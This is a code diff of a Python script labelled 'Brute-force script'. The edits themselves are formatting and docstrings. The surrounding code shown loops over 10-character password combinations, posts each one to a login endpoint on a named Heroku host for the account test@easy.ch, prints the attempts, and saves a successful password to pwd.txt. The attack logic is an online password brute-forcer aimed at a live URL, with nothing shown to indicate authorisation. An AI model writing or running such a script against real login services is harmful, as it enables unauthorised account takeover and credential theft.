@@ -1,3 +1,6 @@
+"""
+Brute-force script
+"""
 import itertools
 import os
 import string
@@ -6,6 +9,10 @@ import requests
 
 
 def main():
+    """
+    Main function
+    :return:
+    """
     start_char = sys.argv[1]
 
     password_length = 10
@@ -32,10 +39,11 @@ def main():
                                 "email": "test@easy.ch",
                                 "password": combination,
                             }
-                            response = session.post("https://serverapp-afb1a71b45e2.herokuapp.com/login", json=payload, timeout=5)
+                            response = session.post("https://serverapp-afb1a71b45e2.herokuapp.com/login",
+                                                    json=payload, timeout=5)
                             print(combination, response.status_code)
                             if response.ok:
-                                print("Password: "+combination)
+                                print("Password: " + combination)
                                 with open("pwd.txt", "w") as f:
                                     f.write(combination)
                                 break
